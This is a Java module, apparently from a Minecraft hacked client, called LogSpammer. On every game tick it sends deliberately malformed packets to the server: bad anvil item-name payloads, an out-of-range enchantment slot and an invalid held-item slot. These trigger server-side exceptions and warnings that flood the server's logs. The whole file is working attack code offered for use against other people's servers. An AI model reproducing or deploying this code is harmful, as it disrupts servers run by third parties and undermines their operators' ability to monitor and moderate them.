package io.github.alerithe.client.features.modules.impl.miscellaneous;

import io.github.alerithe.client.events.game.EventTick;
import io.github.alerithe.client.features.modules.Module;
import io.github.alerithe.client.features.properties.impl.BooleanProperty;
import io.github.alerithe.client.utilities.GameHelper;
import io.github.alerithe.client.utilities.NetworkHelper;
import io.github.alerithe.events.impl.Subscribe;
import io.netty.buffer.Unpooled;
import net.minecraft.client.gui.GuiEnchantment;
import net.minecraft.client.gui.GuiRepair;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C09PacketHeldItemChange;
import net.minecraft.network.play.client.C11PacketEnchantItem;
import net.minecraft.network.play.client.C17PacketCustomPayload;

public class LogSpammer extends Module {
    private final BooleanProperty anvilText = new BooleanProperty("Anvil", new String[0], true);
    private final BooleanProperty enchantSlot = new BooleanProperty("EnchantTable", new String[0], true);
    private final BooleanProperty nullHand = new BooleanProperty("NullHand", new String[0], true);

    public LogSpammer() {
        super("LogSpammer", new String[]{"logspam"}, Type.MISCELLANEOUS);

        getPropertyManager().add(anvilText);
        getPropertyManager().add(enchantSlot);
        getPropertyManager().add(nullHand);
    }

    @Override
    public void onEnable() {
        GameHelper.printChatMessage("\247eAnvils: \247rRight-click to activate.");
        GameHelper.printChatMessage("\247eEnchantment Tables: \247rRight-click and place Lapis Lazuli to activate.");
        GameHelper.printChatMessage("\247eNull Hand: \247rUnlikely to work on modded (ie. Spigot, Paper, etc) servers.");
    }

    @Subscribe
    private void onTick(EventTick event) {
        if (!event.isInGame()) return;

        sendInvalidAnvilText();
        sendInvalidEnchantSlot();
        sendInvalidHandSlot();
    }

    private void sendInvalidAnvilText() {
        if (!anvilText.getValue()) return;
        if (!(GameHelper.getGame().currentScreen instanceof GuiRepair)) return;

        // Throws an IndexOutOfBoundsException
        {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeVarIntToBuffer(1);
            NetworkHelper.sendPacket(new C17PacketCustomPayload("MC|ItemName", buffer));
            GameHelper.printChatMessage("Sent IndexOutOfBounds payload.");
        }

        // Throws a DecoderException
        {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeVarIntToBuffer(131069);
            NetworkHelper.sendPacket(new C17PacketCustomPayload("MC|ItemName", buffer));
            GameHelper.printChatMessage("Sent Decoder payload.");
        }
    }

    private void sendInvalidEnchantSlot() {
        if (!enchantSlot.getValue()) return;
        if (!(GameHelper.getGame().currentScreen instanceof GuiEnchantment)) return;

        // Throws an IndexOutOfBoundException
        GuiEnchantment gui = (GuiEnchantment) GameHelper.getGame().currentScreen;
        if (gui.container.getLapisAmount() < 1) return;

        NetworkHelper.sendPacket(new C11PacketEnchantItem(gui.container.windowId, 3));
        GameHelper.printChatMessage("Sent IndexOutOfBounds payload.");
    }

    private void sendInvalidHandSlot() {
        if (!nullHand.getValue()) return;

        // Prints out "<Player> tried to set an invalid carried item"
        NetworkHelper.sendPacket(new C09PacketHeldItemChange(-1));
        GameHelper.printChatMessage("Sent Null Hand");
    }
}
